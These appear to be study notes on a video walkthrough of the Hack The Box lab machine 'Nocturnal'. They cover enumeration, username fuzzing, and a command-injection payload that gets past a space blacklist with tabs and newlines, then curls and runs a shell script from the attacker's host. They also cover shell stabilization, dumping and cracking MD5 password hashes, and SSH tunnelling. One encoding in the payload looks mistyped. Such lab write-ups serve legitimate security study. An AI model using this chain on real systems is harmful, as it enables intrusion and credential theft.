- https://www.youtube.com/watch?v=tjA3sXsnPqw
- dir enum: `gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -u http://nocturnal.htb`
- *thought that maybe he can find a way to enumerate valid usernames through the login form by using the error message.*
- *gets the valid file types error by uploading a random file.*

- php payload (proof of concept) for the file upload functionality:

```php
<?php phpinfo(); ?>
```

- the files are stored in a database so maybe we can use [[SQL Injection]] for [file disclosure](https://medium.com/@julius.grosserode.19/local-file-disclosure-743f88291211).

to find every wordlist for usernames:
```bash
cd /opt/SecLists/
find . | grep -i username
```

- Burp Suite -> copy the request file with `username=FUZZ` -> saved it as `view.req` ->
  `ffuf -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -request view.req -request-proto http -fs 2985`
- Burp Suite -> Copy as curl command (bash)
	- pasted the command and saved the output to `privacy.odt`
	- removed the headers of the response so he can open the file.

- *gets creds for "amanda", logs in, gets access to the source code of `admin.php`*
- found the command injection vulnerability in the `password` parameter
- "but if we have a process open we can use line breaks" - for bypassing the blacklist
- `$IFS` - internal field separator, it tells the shell what characters should be used for splitting words (like `\n`,`\t`,` `)
- IppSec used <u>tabs</u> because the <u>space</u> character is blacklisted. 
	- encoded a new line to using burp suite's url encoding feature and the result is: `%0d%0a`
	- same for the <u>tab</u>: `%09`
- payload:
```bash
password=PleaseSubscribe"%0acurl    -o    /dev/shm/shell.sh    http://10.10.14.8:8000/shell.sh%abash    /dev/shm/shell.sh%0a&backup= 
```

- shell stabilization:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

# CTRL+Z to suspend the process

stty raw -echo;fg
export term=XTERM
stty rows 26 cols 121
```

- `ssty` is a command utility used for change the terminal line settings.
	- `raw` - `CTRL+C` won't send SIGINT, `CTRL+Z` won't suspend the process.
	- `-echo` - typed characters are not shown on the screen, useful for things like password input.

- `export term=XTERM` - to change the terminal emulator. You can now clear the terminal with `CTRL+L`

- searched for the database so he can extract the credentials. A great way to find the database file is in the `login.php` or `register.php`

```bash
sqlite3 nocturnal_database.db
#in the sql prompt he used '.dump'

sqlite3 nocturnal_database.db "select password from users";
```

- found all the hashes (32-character hexadecimal strings, usually MD5) and pasted them in [crackstation.net](https://crackstation.net/)
- `su - tobias` - switched to user `tobias` and loads the the user's environment variables like `HOME=/home/tobias`, `USER=tobias`, etc.
- checked `sudo -l`
- `ss -lntp`, show open ports in listening state
- `curl -I 127.0.0.1:8080` - get headers of the response.
- cd' into `/etc`, then `grep -R 8080 2>/dev/null` to get more info on the service running on port 8080
- in an OpenSSH session after pressing `Enter`: you can use `~C` to enter the SSH prompt. You must have the `EnableEscapeCommandline=yes` option in `/etc/ssh/ssh_config` or you can pass it inline: `ssh -o EnableEscapeCommandline=yes user@host`
- SSH port forwarding (tunneling) `ssh> -L 8081:127.0.0.1:8080`